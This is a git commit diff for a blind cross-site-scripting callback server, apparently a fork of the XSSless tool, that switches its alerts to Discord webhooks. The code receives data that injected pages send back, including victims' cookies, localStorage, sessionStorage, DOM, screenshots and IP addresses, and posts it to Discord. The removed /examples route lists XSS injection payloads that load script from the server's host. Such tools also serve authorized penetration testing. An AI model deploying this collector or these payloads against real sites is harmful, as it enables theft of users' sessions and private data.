613019ae6e118d51c92c4599699b2ad33debabc6
Felix Mosheev <9304194+felixmosh@users.noreply.github.com>
2023-01-05 15:04:29 +0200

    Add support for discord

--- index.js
+++ index.js
@@ -12,7 +12,7 @@ import * as url from "url";
 // Support local development with .env
 import { config } from "dotenv";
 import { uploadImage } from "./src/uploadImage.js";
-import { notifyOOBCallback } from "./src/notifyDiscord.js";
+import { notifyBXSS, notifyMessage } from "./src/notifyDiscord.js";
 
 config();
 
@@ -27,84 +27,40 @@ app
   .disable("x-powered-by")
   .use(cors())
   .use(bodyParser.json({ limit: "15mb" }))
-  .use(bodyParser.urlencoded({ limit: "15mb", extended: true }));
-
-app.use((req, res, next) => {
-  // Headers
-  // res.header("X-Powered-By", "XLESS");
-  res.header("Access-Control-Allow-Origin", "*");
-  res.header("Access-Control-Allow-Methods", "GET,POST");
-  res.header("Access-Control-Allow-Headers", "Content-Type");
-  next();
-});
-
-function generate_blind_xss_alert(body) {
-  const alert = "*XSSless: Blind XSS Alert*\n";
-  for (let k of Object.keys(body)) {
-    if (k === "Screenshot") {
-      continue;
-    }
-
-    if (body[k] === "") {
-      alert += "*" + k + ":* " + "```None```" + "\n";
-    } else {
-      alert += "*" + k + ":* " + "```" + body[k] + "```" + "\n";
-    }
-  }
-  return alert;
-}
-
-function generate_callback_alert(headers, data, url) {
-  let alert = "*XSSless: Out-of-Band Callback Alert*\n";
-  alert += `• *IP Address:* \`${data["Remote IP"]}\`\n`;
-  alert += `• *Request URI:* \`${url}\`\n`;
-
-  // Add all the headers
-  for (const key in headers) {
-    if (headers.hasOwnProperty(key)) {
-      alert += `• *${key}:* \`${headers[key]}\`\n`;
-    }
-  }
-  return alert;
-}
-
-function generate_message_alert(body) {
-  let alert = "*XSSless: Message Alert*\n";
-  alert += "```\n" + body + "```\n";
-  return alert;
-}
+  .use(bodyParser.urlencoded({ limit: "15mb", extended: true }))
+  .use((req, res, next) => {
+    // Headers
+    res.header("Access-Control-Allow-Origin", "*");
+    res.header("Access-Control-Allow-Methods", "GET,POST");
+    res.header("Access-Control-Allow-Headers", "Content-Type");
+    next();
+  });
 
 app.get("/favicon.ico", (_req, res) => {
   res.end();
 });
 
-app.get("/examples", (req, res) => {
-  res.header("Content-Type", "text/plain");
-  //const url = req.protocol + '://' + req.headers['host']
-  const url = "https://" + req.headers["host"];
-  let page = "";
-  page += `\'"><script src="${url}"></script>\n\n`;
-  page += `javascript:eval('const a=document.createElement(\\'script\\');a.src=\\'${url}\\';document.body.appendChild(a)')\n\n`;
+app.get("/test", (req, res) => {
+  res.header("Content-Type", "text/html");
 
-  page += `<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "${url}");a.send();</script>\n\n`;
+  const url = "//" + req.headers["host"];
 
-  page += `<script>$.getScript("${url}")</script>`;
-  res.send(page);
+  res.send(`TEST<script src="${url}"></script>`);
 });
 
 app.all("/message", (req, res) => {
-  const message = req.query.text || req.body.text;
-  const alert = generate_message_alert(message);
-  data = {
-    form: {
-      payload: JSON.stringify({ username: "XLess", mrkdwn: true, text: alert }),
-    },
-  };
+  res.send("ok");
+  res.end();
 
-  request.post(process.env.DISCORD_INCOMING_WEBHOOK, data, (out) => {
-    res.send("ok\n");
-    res.end();
-  });
+  const message = req.query.text || req.body.text || "";
+  if (message) {
+    notifyMessage(
+      {
+        message,
+      },
+      discordIncomingWebhook
+    );
+  }
 });
 
 app.post("/c", async (req, res) => {
@@ -114,7 +70,7 @@ app.post("/c", async (req, res) => {
   let data = req.body;
 
   // Upload our screenshot and only then send the Slack alert
-  data["Screenshot URL"] = "";
+  data["Screenshot URL"] = "NA";
 
   if (imgbbApiKey && data["Screenshot"]) {
     const encoded_screenshot = data["Screenshot"].replace(
@@ -122,13 +78,13 @@ app.post("/c", async (req, res) => {
       ""
     );
 
+    delete data["Screenshot"];
+
     try {
       const imgOut = await uploadImage(encoded_screenshot, imgbbApiKey);
-      if (imgOut.error) {
-        data["Screenshot URL"] = "NA";
-      } else if (imgOut.data && imgOut.data.url_viewer) {
+      if (imgOut.data?.display_url) {
         // Add the URL to our data array, so it will be included on our Slack message
-        data["Screenshot URL"] = imgOut.data.url_viewer;
+        data["Screenshot URL"] = imgOut.data.display_url;
       }
     } catch (e) {
       data["Screenshot URL"] = e.message;
@@ -138,14 +94,8 @@ app.post("/c", async (req, res) => {
   // Now handle the regular Slack alert
   data["Remote IP"] =
     req.headers["x-forwarded-for"] || req.connection.remoteAddress;
-  const alert = generate_blind_xss_alert(data);
-  data = {
-    form: {
-      payload: JSON.stringify({ username: "XLess", mrkdwn: true, text: alert }),
-    },
-  };
 
-  request.post(discordIncomingWebhook, data, (out) => {});
+  notifyBXSS(data, discordIncomingWebhook);
 });
 
 /**
@@ -190,15 +140,15 @@ app.all("/*", (req, res) => {
   const headers = req.headers;
   const body = req.body;
 
-  notifyOOBCallback(
-    {
-      body,
-      headers,
-      path: req.url,
-      remoteIP: req.headers["x-forwarded-for"] || req.connection.remoteAddress,
-    },
-    discordIncomingWebhook
-  );
+  // notifyOOBCallback(
+  //   {
+  //     body,
+  //     headers,
+  //     path: req.url,
+  //     remoteIP: req.headers["x-forwarded-for"] || req.connection.remoteAddress,
+  //   },
+  //   discordIncomingWebhook
+  // );
 
   res.sendFile(path.join(__dirname, "payload.js"));
 });
--- src/notifyDiscord.js
+++ src/notifyDiscord.js
@@ -45,3 +45,109 @@ export function notifyOOBCallback(data, webhookUrl) {
     })
     .catch((error) => console.error("ERROR:", error?.response?.data || error));
 }
+
+export function notifyMessage(data, webhookUrl) {
+  return discordApi
+    .post(webhookUrl, {
+      username,
+      avatar_url,
+      embeds: [
+        {
+          title: "Message Alert",
+          description: ["```", data.message.toString(), "```"].join("\n"),
+          color: 15258703,
+        },
+      ],
+    })
+    .catch((error) => console.error("ERROR:", error?.response?.data || error));
+}
+
+export function notifyBXSS(data, webhookUrl) {
+  const fields = Object.entries(data)
+    .map(([name, value]) => {
+      value = value || "NA";
+
+      if (name === "Screenshot URL" && value !== "NA") {
+        return false;
+      } else if (name === "DOM") {
+        value = ["```html", value, "```"].join("\n");
+      } else if (["localStorage", "sessionStorage"].includes(name)) {
+        try {
+          value = [
+            "```json",
+            JSON.stringify(JSON.parse(value), null, 2),
+            "```",
+          ].join("\n");
+        } catch (e) {
+          //
+        }
+      } else if (name === "Cookies") {
+        const cookie = Object.fromEntries(
+          value.split(";").map((entry) =>
+            entry
+              .trim()
+              .split("=")
+              .map((x) => x.trim())
+          )
+        );
+        value = ["```json", JSON.stringify(cookie, null, 2), "```"].join("\n");
+      } else if (
+        ["Location", "Origin", "Referrer"].includes(name) &&
+        value !== "NA"
+      ) {
+        value = `[${value}](${value})`;
+      } else if (name === "Remote IP") {
+        value = `[${value}](https://whois.domaintools.com/${value})`;
+      }
+      return { name, value: value.slice(0, 4080) };
+    })
+    .filter(Boolean)
+    .sort((a, z) => a.name.localeCompare(z.name));
+
+  const longFields = fields.filter((entry) => entry.value.length > 1024);
+
+  const payloads = [
+    {
+      username,
+      avatar_url,
+      embeds: [
+        {
+          title: "Blind XSS Alert",
+          color: 15347978,
+          fields: fields.filter((entry) => entry.value.length < 1024),
+          ...(data["Screenshot URL"] !== "NA"
+            ? {
+                image: {
+                  url: data["Screenshot URL"],
+                },
+              }
+            : {}),
+        },
+      ],
+    },
+  ].concat(
+    longFields.map((longField) => ({
+      username,
+      avatar_url,
+      embeds: [
+        {
+          title: longField.name,
+          description: longField.value,
+          color: 15347978,
+        },
+      ],
+    }))
+  );
+
+  return payloads.reduce(
+    (lastPromise, payload) =>
+      lastPromise.then(() =>
+        discordApi
+          .post(webhookUrl, payload)
+          .catch((error) =>
+            console.error("ERROR:", error?.response?.data || error)
+          )
+      ),
+    Promise.resolve()
+  );
+}
